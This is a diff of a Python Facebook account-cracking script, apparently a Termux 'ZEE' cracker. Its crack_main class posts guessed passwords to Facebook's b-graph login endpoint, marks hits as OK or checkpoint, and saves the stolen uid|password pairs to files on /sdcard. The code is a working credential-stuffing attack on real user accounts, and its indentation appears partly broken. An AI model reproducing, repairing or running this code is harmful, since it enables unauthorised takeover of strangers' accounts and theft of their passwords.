@@ -440,24 +440,31 @@ class crack_main():
                         url = 'https://b-graph.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
-                                #print(po,hdata)ata)
                                 if 'session_key' in po:
                                 try:
-                                        roid = str(po['uid'])
+                                        uid = po['uid']
                                 except:
-                                        roid = iid
-                                        print(' \033[1;32m[ZEE-OK] '+roid+' | '+pas+'\033[0;97m')
-                                        open('/sdcard/zee_ok.txt','a').write(roid+'|'+pas+'\n')
-                                        ok.append(iid)
-                                        break
-                                elif 'Please Confirm Email' in po:
-                                        print(' \033[1;32m[ZEE-OK] '+roid+' | '+pas+'\033[0;97m')
-                                        open('/sdcard/zee_ok.txt','a').write(roid+'|'+pas+'\n')
-                                        ok.append(iid)
+                                        uid = ids
+                                if str(uid) in oks:
                                         break
                                 else:
-                                        continue
-                        loop+=1
+                                        print('\r\r\033[1;32m [ZEE-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/AKINGZEE-M-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        oks.append(str(uid))
+                                        break
+                        elif 'www.facebook.com' in po['error']['message']:
+                                try:
+                                        uid = po['error']['error_data']['uid']
+                                except:
+                                        uid = ids
+                                if uid in oks:pass
+                                else:
+                                        print('\r\r\x1b[38;5;208m [ZEE-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/ZEE-M-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        cps.append(str(ids))
+                                        break
+                        else:continue
+                loop+=1
                 except Exception as e:
                         pass
                         #print(e)
